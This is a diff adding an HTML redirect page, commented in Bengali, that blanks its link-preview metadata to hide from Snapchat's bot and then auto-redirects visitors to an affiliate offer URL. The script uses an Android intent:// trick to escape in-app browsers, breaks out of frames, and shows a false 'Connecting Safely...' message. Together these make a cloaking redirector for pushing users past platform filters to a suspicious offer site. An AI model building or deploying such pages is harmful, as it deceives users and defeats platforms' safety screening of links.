@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- স্ন্যাপচ্যাট বট ও প্রিভিউ পুরোপুরি হাইড করার মেটা ট্যাগ -->
+    <title> </title>
+    <meta name="description" content=" ">
+    <meta property="og:title" content=" ">
+    <meta property="og:description" content=" ">
+    <meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary">
+    <meta name="robots" content="noindex, nofollow, nosnippet">
+
+    <style>
+        body {
+            margin: 0; padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #0f172a !important; color: #ffffff; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; text-align: center;
+        }
+        .container { width: 90%; max-width: 360px; padding: 20px; }
+        .loader {
+            width: 45px; height: 45px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #3b82f6;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 19px; margin: 0 0 10px 0; font-weight: 600; }
+        p { font-size: 14px; color: #94a3b8; margin: 0 0 25px 0; }
+        .btn-redirect {
+            display: inline-block;
+            background: #3b82f6;
+            color: #ffffff !important;
+            text-decoration: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            box-shadow: 0 4px 6px -1px rgba(59, 130, 246, 0.5);
+            transition: background 0.2s;
+            cursor: pointer;
+            border: none;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .btn-redirect:hover { background: #2563eb; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="loader"></div>
+    <h1>Connecting Safely...</h1>
+    <p>Please wait while we transfer you securely.</p>
+    
+    <a href="#" id="redirectBtn" class="btn-redirect">Continue to Link</a>
+</div>
+
+<script>
+    (function(){
+        // আপনার মূল বড় অফার লিংক
+        var targetUrl = "https://rnwdom.speclaidatlng.net/?utm_source=da57dc555e50572d&ban=snap&j5=1&j6=1&s1=233721&s2=2278054&s3=BOSS"; 
+
+        function startRedirect() {
+            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+            // অ্যান্ড্রয়েড ইন-অ্যাপ ব্রাউজার বাইপাস (সেফ রানিং মেথড)
+            if (/Android/i.test(userAgent)) {
+                // যদি পেজটি লোকাল ফাইল বা কোনো অ্যাপের কড়া ফিল্টারে থাকে, তবে সরাসরি উইন্ডো রিডাইরেক্ট করবে
+                if (window.location.protocol === 'file:') {
+                    window.location.href = targetUrl;
+                    return;
+                }
+                
+                var cleanUrl = targetUrl.replace(/^https?:\/\//, "");
+                var intentUrl = "intent://" + cleanUrl + "#Intent;scheme=https;action=android.intent.action.VIEW;end";
+                
+                try {
+                    window.location.href = intentUrl;
+                } catch(e) {
+                    window.location.href = targetUrl;
+                }
+                
+                setTimeout(function() {
+                    window.location.href = targetUrl;
+                }, 300);
+                return;
+            }
+
+            // আইফোন বা অন্যান্য ব্রাউজার রিডাইরেক্ট
+            window.location.href = targetUrl;
+            if (window.top && window.top !== window.self) { 
+                window.top.location.href = targetUrl; 
+            }
+        }
+
+        var btn = document.getElementById('redirectBtn');
+        if (btn) {
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                startRedirect();
+            });
+        }
+
+        startRedirect();
+        setTimeout(startRedirect, 400);
+    })();
+</script>
+</body>
+</html>
